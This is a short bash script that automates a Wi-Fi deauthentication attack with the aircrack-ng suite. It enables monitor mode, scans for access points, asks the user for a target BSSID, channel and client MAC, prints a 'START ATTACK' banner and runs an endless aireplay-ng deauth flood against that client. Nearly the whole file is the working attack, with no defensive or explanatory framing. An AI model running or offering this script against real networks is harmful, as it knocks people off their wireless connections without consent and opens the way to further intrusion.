#!/bin/bash


red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"

echo ' '
read -p "[$(echo -e $blue"?"$reset)] Enter name interface : " Interface

MON=mon

# start wlan?
airmon-ng start $Interface

# to show bssid and channel
airodump-ng $Interface$MON

echo ' '
# bssid for wifi
read -p "[$(echo -e $blue"?"$reset)] Enter BSSID : " bssid

# channel for wifi
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CH

# t osee clint (devices)
airodump-ng --bssid $bssid $Interface$MON
echo ' '
# mac adderss clint
read -p "[$(echo -e $blue"?"$reset)] Enter MAC clint :" MAC

# change the CH to CH wifi
airmon-ng start $Interface$MON $CH
echo ' '
echo -en "$blue------------------$reset"
echo -en "$red   START ATTACK   $reset"
echo -en "$blue------------------$reset"


# start attack ...
aireplay-ng -0 0 -a $bssid -c $MAC $Interface$MON

airmon-ng stop $Interface$MON
